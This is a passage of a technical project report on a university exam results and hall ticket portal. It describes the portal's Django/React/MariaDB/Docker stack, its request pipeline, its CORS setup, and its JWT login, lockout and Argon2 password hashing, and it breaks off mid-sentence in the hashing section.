# SPMVV Exam Results Portal
# Technical Project Report

**Institution    :** Sri Padmavati Mahila Visvavidyalayam (SPMVV), Tirupati, Andhra Pradesh
**Application    :** Exam Results Management and Hall Ticket Portal
**Server Address :** 10.127.248.83
**Project Path   :** /root/spmvv-exam-results
**Report Version :** 2.0 (Expanded Edition)
**Report Date    :** February 2026
**Prepared By    :** Development Team

---

## Table of Contents

 1. Introduction and Background
 2. Technical Stack Overview
 3. Application Architecture and Data Flow
 4. Authentication - Login and Registration
 5. Student Features - Detailed Explanation
 6. Admin Features - Detailed Explanation
 7. Database Design and Schema
 8. Backend Libraries and Frameworks
 9. Frontend Libraries and Frameworks
10. Security Architecture and Implementation
11. Deployment Architecture
12. Deployment Script Walkthrough
13. Project File Structure and Purpose of Each File
14. API Endpoint Reference
15. Error Handling Strategy
16. Logging and Monitoring
17. Future Enhancements and Recommendations

---

## 1. Introduction and Background

### 1.1 About the Institution

Sri Padmavati Mahila Visvavidyalayam (SPMVV) is a premier women's university
established by the Government of Andhra Pradesh, situated in Tirupati — a city
of significant historical, religious, and educational importance in South India.
The university is named after Goddess Padmavathi, the consort of Lord Venkateswara,
and was established with the specific mission of providing higher education
exclusively to women, addressing the historical gender gap in access to advanced
learning in the region.

SPMVV offers a wide spectrum of programmes spanning undergraduate (B.Tech, B.Sc,
B.Com, B.A), postgraduate (M.Tech, M.Sc, MBA, MCA, M.A, M.Com), and doctoral
(Ph.D) levels. The university is spread across multiple departments including
Computer Science and Engineering, Electronics and Communication Engineering,
Electrical Engineering, Mechanical Engineering, Civil Engineering, Management
Sciences, Pure Sciences (Physics, Chemistry, Mathematics, Biotechnology), Social
Sciences, and Humanities. At any given time, the university serves several
thousand active students across these programmes.

Each semester, the university conducts end-of-semester examinations as part of
its Continuous and Comprehensive Evaluation (CCE) system. Results of these
examinations — which determine a student's academic standing, eligibility for
promotion to the next semester, scholarship status, and eventual degree
classification — are among the most important pieces of information the
university communicates to its students.

### 1.2 The Traditional System and Its Limitations

Prior to the development of this digital portal, SPMVV relied on a combination
of manual and semi-digital processes to manage and distribute examination results.
Understanding these limitations in detail is essential to appreciating the design
choices made in the portal.

**Physical Notice Board Publication:**
Results were traditionally posted on physical notice boards located at department
buildings and the main administrative block. Students had to physically travel to
the campus to read their results. For students who lived in remote areas, hostels
far from campus, or were temporarily away from the city, this was a significant
inconvenience. There was no way to access results from home or through a mobile
device. Additionally, physical notice boards offered no privacy — any passerby
could read any student's results, which was a concern for students who performed
poorly.

**PDF and Email Distribution:**
An improvement over notice boards was the practice of generating result PDFs and
distributing them via email or uploading them to a generic file server. However,
this introduced its own problems. Emails could go to junk folders. File servers
required students to know the correct URL and download links changed every
semester. PDFs contained results for entire classes, meaning individual students
had to search through large documents for their own records. There was no
personalization, no filtering, and no history.

**Manual Spreadsheet Management:**
Academic office staff maintained results in Microsoft Excel spreadsheets. These
files grew over time, were often stored on individual computers without backups,
and had no version control. When a correction needed to be made, tracking who
made the change, when, and why was impossible. Multiple staff members sometimes
worked on different copies of the same spreadsheet, leading to merge conflicts
and data inconsistencies.

**Hall Ticket Distribution:**
Examination hall tickets — which students must present at the exam center to be
permitted entry — were printed and distributed manually. This process involved
printing hundreds of tickets, sorting them by roll number, distributing them to
department offices, and having students collect them in person. Tickets could be
lost, damaged, or forgotten. Verifying the authenticity of a hall ticket at the
exam center was done visually, with no digital verification mechanism. Late
distribution was common, causing anxiety among students.

**No Academic History View:**
Students had no single place to see their complete academic record across all
semesters. To understand their academic trajectory, a student had to collect
multiple physical mark sheets or PDF files from different semesters and compare
them manually. There was no automatic SGPA or CGPA calculation, no trend
visualization, and no way to quickly answer the question "how am I performing
overall?"

**Security and Audit Gaps:**
The traditional system had no meaningful audit trail. If a result was changed in
a spreadsheet, there was no log of who changed it. If a staff member wanted to
look up a student's results maliciously, there was nothing to detect or prevent
this. There was no authentication, no access control, and no accountability.

### 1.3 Vision and Goals of the Portal

The SPMVV Exam Results Portal was conceived as a comprehensive solution that
addresses every one of the above limitations. The vision can be summarized in
four goals:

**Goal 1: Universal, Anytime Access**
Any student should be able to access their complete academic record from any
device — desktop, laptop, or mobile — at any time of day, from any location
with internet access. The portal achieves this through a responsive web interface
that works on all screen sizes and an always-available REST API backend running
in Docker containers with automatic restart policies.

**Goal 2: Personalized, Structured Information**
Instead of searching through class-wide PDFs, each student sees only their own
results, automatically organized by semester, with SGPA and CGPA calculated
automatically. The visual presentation using charts makes it easy for students
to understand their academic trajectory at a glance.

**Goal 3: Secure, Role-Appropriate Access**
No student should ever be able to see another student's results. Administrative
functions should only be available to verified staff members with the appropriate
permissions. Every action should be logged and attributable to a specific user.
The portal achieves this through JWT authentication, role-based access control,
granular admin permissions, and comprehensive audit logging.

**Goal 4: Streamlined Administration**
Administrative tasks like uploading results, creating circulars, sending
notifications, and generating hall tickets should be fast, reliable, and
error-resistant. The portal achieves this through bulk Excel upload with
row-by-row validation, automated PDF generation, and a clean admin dashboard
that groups related functions together.

### 1.4 Scope of the System

The portal covers the following functional areas:

1. **Student Self-Service Portal**: Registration, login, result viewing, SGPA/CGPA,
   statistics, notifications, circulars, and hall ticket download.
2. **Result Management**: Bulk upload of results from Excel, view/search/delete
   individual records, audit trail of all changes.
3. **User Account Management**: Admin-controlled creation, editing, and deactivation
   of student and admin accounts.
4. **Communication System**: Admin-to-student notifications (targeted by branch or
   broadcast to all), university circulars/announcements.
5. **Hall Ticket System**: End-to-end hall ticket lifecycle — exam creation, student
   enrollment, photo upload, automated PDF generation with QR codes, and student
   download.
6. **Statistics and Analytics**: System-wide statistics for admins (pass rates, grade
   distribution, results per exam), personal academic statistics for students.
7. **Security and Audit**: Brute-force protection, JWT blacklisting, security headers,
   rate limiting, and comprehensive audit logs.

### 1.5 Key Design Principles

The development team adopted the following principles, which influenced every
architectural and implementation decision:

**Principle 1: Security as a First-Class Concern**
Security is not an afterthought added at the end of development — it is baked
into every layer of the system from the very beginning. This means using the
strongest available password hashing algorithm (Argon2), never storing tokens in
insecure storage, adding brute-force protection before the system is even deployed
to users, and validating all inputs at multiple layers.

**Principle 2: Separation of Concerns**
The frontend, backend, and database are three entirely separate systems that
communicate through well-defined interfaces. The frontend knows nothing about how
the backend stores data. The backend knows nothing about how the frontend renders
it. This separation makes each layer independently testable, replaceable, and
deployable.

**Principle 3: Data Integrity Over Convenience**
The system is designed to prioritize correctness of data over ease of data entry.
Excel uploads are validated row-by-row before any data touches the database. A
corrupt or invalid row causes that row to be rejected with a clear error message,
while valid rows are still processed. The database enforces unique constraints to
prevent duplicate records at the lowest possible level.

**Principle 4: Comprehensive Auditability**
The system maintains a complete audit trail. Every login, logout, upload, deletion,
user creation, and notification is recorded with the acting user's identity, IP
address, and timestamp. This is essential for an academic institution where result
integrity is a legal and regulatory matter.

**Principle 5: Operational Simplicity**
The deployment and operational model should be simple enough for a university IT
team to manage without deep DevOps expertise. Docker containers with automatic
restart policies, a single deployment script, and self-contained backup/restore
procedures fulfill this requirement.

**Principle 6: Progressive Enhancement**
The system is designed to work correctly and securely in its current state, while
being architecturally ready for future enhancements. The REST API design, token
rotation, permission flags, and Docker architecture all leave room for expansion
without requiring fundamental redesign.

### 1.6 Technology Philosophy

The choice of technology stack was not arbitrary. Each technology was chosen
after evaluating alternatives against the specific needs of this project:

**Why Python and Django (not Node.js, PHP, or Ruby)?**
Python is the primary language of scientific and data processing communities,
which aligns with the academic data-heavy nature of this project (SGPA calculation,
Excel processing, PDF generation). Django's "batteries included" philosophy means
most of what an academic results portal needs — ORM, authentication, admin, file
handling, migrations — is available without third-party packages. Django has a
strong security track record, a large community, and excellent documentation.
Node.js was considered but rejected because Python has stronger libraries for
the specific tasks needed (Excel parsing with openpyxl/pandas, PDF generation
with ReportLab, image processing with Pillow, QR codes with qrcode).

**Why React (not Angular, Vue, or server-rendered HTML)?**
React's component model is the best fit for a portal with many overlapping UI
concerns: modals that can be opened from multiple places, shared state (who is
logged in, what branch are they in), and reusable pieces like the notification
bell and statistics charts. A server-rendered approach (Django templates) was
considered and rejected because it would require full page reloads for every
action, creating a poor user experience in a portal that users open frequently.
Vue.js was also evaluated but React's ecosystem (Recharts, React Router, React
Icons) is more mature for the components needed.

**Why MariaDB (not PostgreSQL, SQLite, or MongoDB)?**
MariaDB is MySQL-compatible and is widely used in academic and government
institutions in India, making it familiar to university IT staff and well-supported
by cloud and on-premise hosting providers. PostgreSQL offers some advanced features
(arrays, JSON columns, full-text search) that this project does not need. SQLite
was immediately ruled out as unsuitable for multi-user concurrent production use.
MongoDB (NoSQL) was rejected because the data in this system is inherently
relational — students, results, subjects, and enrollments have natural foreign
key relationships that a relational database models perfectly.

**Why Docker?**
Academic institutions face a common problem: the development environment differs
from the production server. Docker eliminates this entirely. The same container
that runs on a developer's laptop runs identically on the university server. When
the university IT team needs to update or redeploy, they run one script. If the
server needs to be migrated to a new machine, the migration is straightforward
because all application code, dependencies, and configuration are in the containers.

---

## 2. Technical Stack Overview

### 2.1 What is a "Stack"?

In software engineering, a "technology stack" refers to the complete set of
technologies used to build and run an application. It typically covers the
operating system and server infrastructure, the backend runtime and framework,
the database, and the frontend. Understanding the stack is essential for
maintenance, debugging, and future development — anyone joining this project
needs to know which technologies to learn.

### 2.2 Backend Stack in Depth

The backend is entirely written in Python. It exposes a REST (Representational
State Transfer) API — a set of HTTP endpoints that receive requests and return
JSON responses. The frontend communicates exclusively through this API; there are
no server-rendered HTML pages.

| Component         | Technology                    | Version  | Purpose                                    |
|-------------------|-------------------------------|----------|--------------------------------------------|
| Web Framework     | Django                        | 5.0.9    | Core framework, ORM, admin, migrations     |
| REST API Layer    | Django REST Framework         | 3.15.2   | API views, serializers, authentication     |
| Authentication    | djangorestframework-simplejwt | 5.3.1    | JWT issuance, refresh, blacklisting        |
| Database          | MariaDB (MySQL-compatible)    | 10.11    | Primary relational data store              |
| DB Driver         | mysqlclient                   | latest   | Python-to-MySQL native C connector         |
| Password Hashing  | argon2-cffi                   | latest   | Argon2 password hashing algorithm          |
| WSGI Server       | Gunicorn                      | 22.0.0   | Production HTTP server (4 workers)         |
| Static Files      | WhiteNoise                    | 6.7.0    | Serve static files without Nginx           |
| Excel Processing  | openpyxl                      | 3.1.5    | Read .xlsx workbooks for result upload     |
| Data Processing   | pandas                        | 2.1.4    | DataFrame-based enrollment processing     |
| PDF Generation    | ReportLab                     | 4.1.0    | Programmatic PDF hall ticket creation      |
| QR Codes          | qrcode                        | 7.4.2    | QR code image generation                   |
| Image Processing  | Pillow                        | 10.2.0   | Photo resize/crop, image format handling   |
| Rate Limiting     | django-ratelimit              | 4.1.0    | Protect endpoints from request flooding    |
| CORS              | django-cors-headers           | 4.4.0    | Allow browser cross-origin API calls       |

### 2.3 Frontend Stack in Depth

The frontend is a Single Page Application (SPA). This means the browser downloads
one HTML file and one JavaScript bundle, and thereafter all navigation happens
by JavaScript changing what is rendered on screen — without loading new HTML
pages from the server. This provides a fast, app-like experience.

| Component      | Technology       | Version | Purpose                                       |
|----------------|------------------|---------|-----------------------------------------------|
| UI Framework   | React            | 18.2.0  | Component-based declarative user interface    |
| Build Tool     | Vite             | 5.0.8   | Fast dev server with HMR, production bundler  |
| Routing        | React Router DOM | 6.20.0  | Client-side URL routing, protected routes     |
| CSS Framework  | Tailwind CSS     | 3.3.6   | Utility-first responsive styling system       |
| HTTP Client    | Axios            | 1.6.2   | REST API calls with interceptor support       |
| Charts         | Recharts         | 3.7.0   | SVG-based bar/pie/line charts                 |
| XSS Protection | DOMPurify        | 3.0.6   | Sanitize HTML/user input against XSS          |
| Icons          | React Icons      | 4.12.0  | Icon components (FontAwesome, Feather, etc.)  |

### 2.4 Infrastructure Stack in Depth

| Component       | Technology        | Version       | Purpose                                      |
|-----------------|-------------------|---------------|----------------------------------------------|
| Containerization| Docker            | latest        | Package and isolate all application layers   |
| DB Container    | MariaDB image     | 10.11         | Containerized database server                |
| Backend Image   | Python slim       | 3.11-slim     | Minimal base image for Django container      |
| Frontend Image  | Node Alpine+Nginx | 18-alpine     | Build React, serve with Nginx                |
| Docker Network  | Bridge network    | spmvv_network | Isolated container-to-container communication|
| Storage         | Named volume      | spmvv_mysql_data | Persistent database data across restarts  |
| Host OS         | RHEL/CentOS Linux | 8+            | VM operating system                          |
| Firewall        | firewalld         | system        | Port-level access control on host VM         |

### 2.5 Why These Versions Were Chosen

Django 5.0.9 is a Long-Term Support (LTS)-adjacent release, providing stability
while offering modern Python async-ready architecture. Python 3.11 was chosen
as the runtime because it delivers measurable performance improvements over 3.10
(faster startup, improved error messages, 10-60% faster execution on many workloads)
while being widely available in official Docker images.

MariaDB 10.11 is itself an LTS release, supported until 2028, making it a safe
choice for a university system that may not be updated frequently.

React 18.2.0 is the current stable release at the time of development, bringing
concurrent rendering improvements and automatic batching of state updates.

Node 18 Alpine is used for the frontend build stage because Alpine Linux images
are significantly smaller than standard Debian/Ubuntu images (5MB vs 100MB+ base),
reducing Docker image pull times and build cache sizes.


---

## 3. Application Architecture and Data Flow

### 3.1 What is Application Architecture?

Application architecture refers to the high-level structural organization of a
software system — how its major components are divided, how they communicate,
and what responsibilities each component holds. Getting the architecture right is
one of the most consequential decisions in any software project because it
determines how easily the system can be maintained, extended, debugged, and scaled.
A poor architectural choice made early can require expensive rewrites years later.

For the SPMVV portal, the architecture was chosen to achieve three goals: clear
separation of responsibilities, independent deployability of each layer, and
security through isolation.

### 3.2 Three-Tier Architecture

The portal follows the classic **three-tier architecture** pattern, where the
system is divided into three logical layers, each with a distinct responsibility:

**Tier 1 — Presentation Layer (Frontend)**
This is what the user sees and interacts with. It is a React Single Page
Application that runs entirely in the user's web browser. The presentation layer
is responsible for rendering user interface components, collecting user input,
displaying data received from the backend, and managing navigation between pages.
Critically, the presentation layer contains NO business logic and NO database
access — it only knows how to display information and call APIs.

**Tier 2 — Business Logic Layer (Backend)**
This is the Django application running on the server. It is responsible for
enforcing all business rules: who is allowed to see what data, how results are
calculated, what validation must pass before data is saved, and what actions are
logged. The backend exposes a REST API that the frontend calls. It does not know
or care how the frontend renders the data it returns.

**Tier 3 — Data Layer (Database)**
This is the MariaDB database that stores all persistent data — user accounts,
exam results, subjects, audit logs, notifications, hall tickets, and everything
else. The data layer is purely responsible for durable storage and retrieval.
It enforces data-level constraints (unique keys, not-null constraints, foreign
keys) but does not implement business logic.

Each tier runs in its own Docker container on the university server, communicating
over an isolated Docker bridge network called `spmvv_network`. This isolation
means that even if an attacker somehow compromises the frontend container, they
cannot directly access the database — they must go through the backend API, which
enforces authentication and authorization on every request.

### 3.3 REST API Design Philosophy

REST (Representational State Transfer) is an architectural style for designing
networked applications. A REST API communicates over HTTP and treats every piece
of data as a "resource" identified by a URL. HTTP methods (GET, POST, PUT, DELETE)
express what operation to perform on that resource.

The SPMVV portal's REST API follows these REST principles:

**Statelessness**: Every request from the frontend to the backend must contain
all the information needed to understand and process that request. The server
does not store any session state between requests. This is why every API call
includes a JWT token in the Authorization header — the server does not remember
who you are from the previous request. Statelessness makes the backend horizontally
scalable (multiple instances can handle requests independently) and simpler to
reason about.

**Resource-based URLs**: API endpoints are named after the resources they represent,
not the actions performed. For example, `/api/results/` represents the collection
of results, and the HTTP method (GET to retrieve, POST to create) indicates the
action. This makes the API intuitive and consistent.

**JSON Data Exchange**: All data is exchanged as JSON (JavaScript Object Notation),
a human-readable, language-agnostic format that both Python and JavaScript handle
natively. JSON is simpler and more widely supported than XML for this use case.

**HTTP Status Codes**: The API uses standard HTTP status codes to communicate
outcome (200 for success, 201 for created, 400 for bad request, 401 for
unauthorized, 403 for forbidden, 404 for not found, 500 for server error). This
allows the frontend to handle responses generically without parsing response bodies.

### 3.4 The Django Request Processing Pipeline

Understanding how Django processes an incoming HTTP request is essential for
understanding how authentication, authorization, and security work in this system.
Every single request — whether a login, a result lookup, or a file upload —
passes through this exact pipeline:

**Step 1: Gunicorn Receives the Request**
Gunicorn is the production HTTP server. It listens on port 8000 and maintains
a pool of 4 worker processes. When a browser sends an HTTP request, Gunicorn
picks an available worker and hands the request to it. Workers are independent
processes (not threads), which means they run in true parallelism on multi-core
systems and are protected from each other — a crash in one worker does not
affect the others.

**Step 2: WSGI Interface**
Gunicorn communicates with Django through the WSGI (Web Server Gateway Interface)
protocol, which is a standard Python specification for how web servers talk to
web application frameworks. Django's `wsgi.py` file is the entry point.

**Step 3: Middleware Stack — Inbound Pass**
Django processes every request through an ordered list of middleware components
before it reaches any view. Middleware is code that runs on every request and
every response. The middleware stack in this project, in order, is:

1. `SecurityHeadersMiddleware` — custom, adds security HTTP headers to every response
2. `LoginAttemptMiddleware` — custom, intercepts login requests to check lockout
3. `CorsMiddleware` — handles Cross-Origin Resource Sharing (CORS) headers
4. `SecurityMiddleware` — Django built-in, enforces HTTPS redirects and HSTS
5. `WhiteNoiseMiddleware` — serves static files (CSS, JS, images) directly
6. `SessionMiddleware` — manages session cookies (not used for auth, but required)
7. `CommonMiddleware` — URL normalization, adds trailing slashes
8. `CsrfViewMiddleware` — CSRF token validation
9. `AuthenticationMiddleware` — identifies the user from the session (not JWT;
   JWT auth happens at the view layer through DRF)
10. `MessageMiddleware` — Django messages framework
11. `XFrameOptionsMiddleware` — adds X-Frame-Options header

The order is critical. For example, `CorsMiddleware` must come before most other
middleware because CORS preflight OPTIONS requests should be handled before any
authentication check prevents them. `SecurityHeadersMiddleware` must come first
so its headers are added to every response including those short-circuited by
other middleware.

**Step 4: URL Routing**
After middleware, Django consults its URL configuration to decide which view
function should handle this request. URLs are matched using regular expressions
or path converters. The root configuration in `exam_results/urls.py` delegates
all `/api/` paths to `results/urls.py`, where each path is mapped to a specific
view class.

**Step 5: DRF Authentication**
For views that require authentication, Django REST Framework's authentication
classes run before the view logic. The `JWTAuthentication` class extracts the
`Authorization: Bearer <token>` header, validates the JWT signature using the
`SECRET_KEY`, checks that the token has not expired, checks the blacklist (for
outstanding tokens), and sets `request.user` to the corresponding User object.
If authentication fails, a 401 Unauthorized response is returned immediately.

**Step 6: DRF Permission Checks**
After authentication, DRF checks permission classes. `IsAuthenticated` verifies
`request.user` is not anonymous. `IsAdminUser` verifies `request.user.is_staff`
(which is true for admin-role users). Custom permission checks (like
`can_upload_results`) are done inside the view body, not as DRF permission classes.

**Step 7: View Execution**
The view function/class runs the actual business logic: querying the database
through the ORM, processing data, calling utility functions (Excel parsing,
PDF generation), writing audit logs, and constructing the response.

**Step 8: Serialization**
Django REST Framework serializers convert Python objects (Django model instances,
dictionaries) into JSON-serializable data. They also perform the reverse —
converting incoming JSON into validated Python objects. Serializers define which
fields to include and how to validate them.

**Step 9: Middleware Stack — Outbound Pass**
The response passes back through the middleware stack in reverse order. This is
when `SecurityHeadersMiddleware` adds its headers to the response, when
`CorsMiddleware` adds the `Access-Control-Allow-Origin` header, etc.

**Step 10: Response to Gunicorn and Browser**
Gunicorn sends the final HTTP response back to the browser.

### 3.5 Docker Networking and Container Communication

The three containers (database, backend, frontend) do not communicate directly
through the host network. Instead, they are all connected to a Docker bridge
network named `spmvv_network`. Docker provides automatic DNS resolution within
this network: a container can reach another container simply by using its
container name as the hostname.

This is why the backend's database configuration uses `DB_HOST=spmvv_db` instead
of an IP address. Docker resolves `spmvv_db` to the IP address of the database
container within the network. This means the configuration does not need to
change even if the container's actual IP address changes on restart.

```
Browser (any network)
    |
    | port 2026 (public, through firewall)
    v
spmvv_frontend container (Nginx)
    |
    | port 8000 (internal Docker network only)
    v
spmvv_backend container (Gunicorn/Django)
    |
    | port 3306 (internal Docker network only)
    v
spmvv_db container (MariaDB)
```

The database container port 3306 is NOT exposed to the host machine in production,
meaning it is completely inaccessible from outside the Docker network. The only
way to reach the database is through the backend container's ORM calls. This is
a significant security benefit — even if an attacker were on the same network as
the server, they could not connect to the database directly.

### 3.6 Static File Serving Architecture

Static files are JavaScript bundles, CSS, images, and fonts that the browser needs
to render the frontend. In development, Vite serves these files directly from its
dev server. In production, the workflow is different:

1. During the Docker image build, `npm run build` compiles and bundles all React
   code into optimized static files in the `frontend/dist/` directory.
2. These files are copied into the Nginx container's web root at
   `/usr/share/nginx/html/`.
3. When a browser requests the application, Nginx serves the static HTML/CSS/JS
   files directly from disk — extremely fast, no Python involved.
4. When the JavaScript makes API calls to `/api/...`, Nginx's proxy_pass
   configuration forwards those requests to the backend container.

This architecture means the backend (Python/Django) is never involved in serving
the React application itself — only in handling API calls. WhiteNoise in the
backend serves Django's own static files (admin interface assets), not the React
frontend.

### 3.7 Data Flow for Key Operations

**User Login Flow:**
```
1. Student opens browser, navigates to http://10.127.248.83:2026
2. Nginx serves index.html + React bundle
3. React Router renders <Login /> component
4. Student enters username (roll number) and password
5. DOMPurify sanitizes both inputs on the frontend
6. Axios sends POST /api/login/ with {username, password}
7. LoginAttemptMiddleware intercepts:
   a. Looks up user by username in database
   b. Checks if lockout_until > now() -> returns 403 if locked
8. Django routes to CustomTokenObtainPairView
9. DRF SimpleJWT verifies credentials (Argon2 hash comparison)
10. If wrong: middleware increments failed_login_attempts
    -> if >= 5: sets lockout_until = now + 30 min
11. If correct: middleware resets failed_login_attempts to 0
12. View returns {access: "...", refresh: "...", user: {...}}
13. Frontend: tokenManager.setTokens(access, refresh)
14. Frontend: tokenManager.setUser(userData)
15. AuthContext.setUser(userData) -> React re-renders
16. React Router navigates to /student or /admin based on role
```

**Result Fetch Flow:**
```
1. StudentDashboard mounts -> useEffect triggers
2. api.get('/api/results/') called
3. Axios request interceptor adds Authorization: Bearer <access_token>
4. Request reaches backend port 8000
5. Gunicorn worker picks up request
6. SecurityHeadersMiddleware runs (inbound, no-op)
7. CorsMiddleware allows origin
8. JWTAuthentication validates token -> sets request.user
9. IsAuthenticated permission passes
10. ResultsListView.get_queryset() filters by request.user.username
11. Results serialized to JSON, grouped by exam_name
12. Response passes through middleware (outbound, headers added)
13. Axios response interceptor: status 200 -> passes through
14. React: setResults(response.data)
15. Component re-renders with results grouped by semester
```

### 3.8 Understanding CORS and Why It Exists

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that prevents
a malicious website from making API calls to a different domain using the user's
credentials. Without CORS, if a user is logged into `spmvv.ac.in`, a malicious
website at `evil.com` could make API calls to `spmvv.ac.in/api/results/` in the
background and steal the user's data.

CORS works by having the browser send an "Origin" header with every cross-origin
request. The server responds with an "Access-Control-Allow-Origin" header. If the
origin is not in the allowed list, the browser refuses to expose the response to
the requesting JavaScript code.

In this project, the frontend runs on port 2026 and the backend runs on port 8000.
Because they have different port numbers, they are considered different "origins"
by the browser. The `django-cors-headers` package configures Django to include
the correct CORS headers in responses, allowing the React frontend to successfully
call the backend API.

The CORS configuration is deliberately restrictive — only the specific frontend
origin is allowed, not `*` (all origins). This prevents any other website from
making API calls to the backend.


---

## 4. Authentication - Login and Registration

### 4.1 What is Authentication and Why Does It Matter?

Authentication is the process of verifying that someone is who they claim to be.
In a web application, this typically means verifying that a person presenting a
username and password actually owns that account. Authentication is the gateway
to everything else — without it, anyone could access any student's results,
impersonate administrators, or upload false data.

It is important to distinguish authentication from authorization. Authentication
answers "Who are you?" Authorization answers "What are you allowed to do?" Both
are essential: authentication without authorization would mean that once logged in,
any user could do anything; authorization without authentication would mean the
system trusts identity claims without verifying them.

This portal implements both rigorously. Authentication is handled through JWT tokens.
Authorization is handled through the `role` field (student vs. admin) and the five
granular `can_*` permission flags.

### 4.2 The Problem with Traditional Session-Based Authentication

Most older web applications use session-based authentication: when a user logs in,
the server creates a session record in a database or in memory, generates a random
session ID, and sets it as a cookie in the browser. On every subsequent request,
the browser sends the session cookie, the server looks up the session record, and
identifies the user.

Session-based authentication has several drawbacks for this type of application:

**Server-side state:** The server must store session data, which means the database
has an extra table (or Redis has extra entries) that grows with every active user.
In a stateless REST API, this creates coupling between requests.

**Cookie-based transmission:** Session IDs are typically stored in cookies. Cookies
are sent automatically by the browser with every request to the matching domain,
which makes them vulnerable to Cross-Site Request Forgery (CSRF) attacks. CSRF
protection requires additional tokens and validation.

**Scaling challenges:** If the application is scaled to multiple server instances
(e.g., behind a load balancer), each instance needs access to the same session store,
requiring a shared database or cache layer.

JWT-based authentication solves all of these problems.

### 4.3 JSON Web Tokens (JWT) — Concept and Structure

A JSON Web Token (JWT) is a compact, self-contained way to transmit information
between two parties as a digitally signed JSON object. The key word is
"self-contained" — the token itself carries all the information needed to
authenticate a user, without the server needing to look anything up in a database
for standard requests.

A JWT consists of three Base64URL-encoded parts separated by dots:

```
header.payload.signature
```

**Header:** Specifies the token type and signing algorithm.
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:** Contains "claims" — statements about the user and the token itself.
```json
{
  "user_id": 42,
  "token_type": "access",
  "exp": 1708960800,
  "iat": 1708959000,
  "jti": "a3f8c2e1-4b9d-..."
}
```

- `user_id`: The primary key of the user in the database
- `token_type`: "access" or "refresh"
- `exp`: Expiry timestamp (Unix epoch seconds)
- `iat`: Issued-at timestamp
- `jti`: JWT ID — a unique identifier for this specific token, used for blacklisting

**Signature:** A cryptographic HMAC-SHA256 hash of `header.payload` using the
server's `SECRET_KEY`. This is what prevents forgery — without knowing the
SECRET_KEY, it is computationally infeasible to generate a valid signature.

When the backend receives a token, it:
1. Splits the token at the dots
2. Re-computes the expected signature using the SECRET_KEY
3. Compares with the received signature — if they differ, the token was tampered with
4. Checks the `exp` claim — if it's in the past, the token has expired
5. Checks the blacklist using `jti` — if blacklisted, the token was revoked

All of this happens without any database query for the standard case, making JWT
validation very fast.

### 4.4 Access Tokens vs. Refresh Tokens

The system issues two tokens on login:

**Access Token (30-minute lifetime):**
Used as a bearer credential on every API call. Included in the `Authorization`
header. Because it expires in 30 minutes, the window during which a stolen
access token can be misused is limited to at most 30 minutes.

**Refresh Token (7-day lifetime):**
Used ONLY to obtain a new access token when the current one expires. Sent only
to the `/api/token/refresh/` endpoint. Its longer lifetime means users don't
have to log in every 30 minutes. The refresh token is never sent to any other
endpoint, minimizing its exposure.

This two-token design represents a balance between security and usability:
- If the access token is stolen (e.g., from a network sniff on HTTP), the attacker
  can only use it for up to 30 minutes.
- The refresh token provides long-term session persistence without storing any
  state on the server.
- When a user logs out, the refresh token is blacklisted, immediately invalidating
  the ability to get new access tokens.

### 4.5 Token Rotation and Blacklisting

The configuration `ROTATE_REFRESH_TOKENS = True` means that every time the
frontend calls `/api/token/refresh/`, the server issues a brand new refresh token
AND blacklists the old one. This is called "refresh token rotation."

Why is this important? Consider this attack scenario: an attacker steals a user's
refresh token (perhaps from a compromised device). With rotation disabled, the
attacker can keep getting new access tokens indefinitely, even after the legitimate
user logs in and out. With rotation enabled, the first time either the attacker or
the legitimate user uses the refresh token, the other one's copy is invalidated
(because the old token is blacklisted on rotation). This limits the damage window
of a stolen refresh token.

The blacklist is maintained in the `token_blacklist_blacklistedtoken` database table
managed by `rest_framework_simplejwt.token_blacklist`. On every token refresh
attempt, SimpleJWT queries this table to ensure the presented token hasn't been
revoked.

### 4.6 sessionStorage vs. localStorage — Why the Choice Matters

The frontend stores tokens using `sessionStorage`, not `localStorage`. This is a
deliberate security decision with significant implications.

`localStorage` persists data across browser sessions — the data remains even after
the browser is closed and reopened. `sessionStorage` data is cleared when the
browser tab or window is closed.

In a university computer lab environment, students use shared computers. If tokens
were stored in `localStorage`, a student who forgets to log out would leave their
tokens accessible to the next person who sits down at that computer and opens the
browser. With `sessionStorage`, closing the browser tab automatically clears the
tokens — no explicit logout is required.

Additionally, `sessionStorage` is isolated per tab, meaning tokens in one tab
are not visible to another tab, even for the same domain. This provides additional
isolation in the browser.

The tradeoff is that users must log in again when they open a new tab or restart
the browser. For a results portal accessed occasionally, this is an acceptable
inconvenience.

### 4.7 Brute-Force Attack and Account Lockout

A brute-force attack is an attempt to gain unauthorized access to an account by
systematically trying every possible password combination. Modern password-cracking
tools can attempt thousands of passwords per second against a web API if no
protections are in place.

The `LoginAttemptMiddleware` implements a "progressive lockout" policy:
- The first 4 failed login attempts have no consequence beyond a 401 response.
- On the 5th failed attempt, the account is locked for 30 minutes.
- During lockout, even the correct password will be rejected until the lockout expires.

The lockout data (`failed_login_attempts`, `lockout_until`) is stored directly
on the User model in the database. This means the lockout persists across server
restarts, container restarts, and multiple Gunicorn worker processes — a lockout
set by worker 1 is respected by worker 2 because they both read from the same
database.

The lockout threshold of 5 attempts is a standard industry recommendation. It is
low enough to prevent automated attacks (most brute-force tools would be stopped
immediately) while high enough that legitimate users who mistype their password a
few times are not accidentally locked out.

The lockout duration of 30 minutes is long enough to be a significant deterrent
while not being so long that a legitimate user who accidentally triggers lockout
has to wait an unreasonable amount of time.

### 4.8 Password Hashing with Argon2

When a user sets a password, it must never be stored in plain text. If the database
is ever compromised, plain-text passwords would give attackers immediate access to
every account, and potentially to other services if users reuse passwords.

Instead, passwords are "hashed" — a one-way cryptographic function is applied that
produces a fixed-length output (the hash). When a user logs in, the same function
is applied to the entered password and the result is compared to the stored hash.
Because the function is one-way, even if an attacker has the hash, they cannot
reverse it to get the password.

Not all hash functions are equal. MD5 and SHA-1 are completely unsuitable for
passwords — they are designed to be fast, which means an attacker with a GPU can
try billions of combinations per second. Bcrypt was a significant improvement —
it's deliberately slow. But Argon2 is the current gold standard.

Argon2 won the Password Hashing Competition in 2015, which was a years-long open
competition among cryptographers specifically designed to find the best password
hashing algorithm. Argon2 is designed to be:
- **Memory-hard**: It requires a configurable amount of RAM (default 100MB). This
  makes parallel GPU attacks extremely expensive because GPUs have limited memory
  per core.
- **Configurable time cost**: The number of iterations can be tuned to make the
  algorithm take a specific amount of time (e.g., 500ms) on the target hardware.
- **Resistant to time-memory tradeoffs**: Pre-computed tables (rainbow tables) are
  ineffective because Argon2 uses a random "salt" for each password.

With the default configuration, a single Argon2 hash computation requires ~100MB
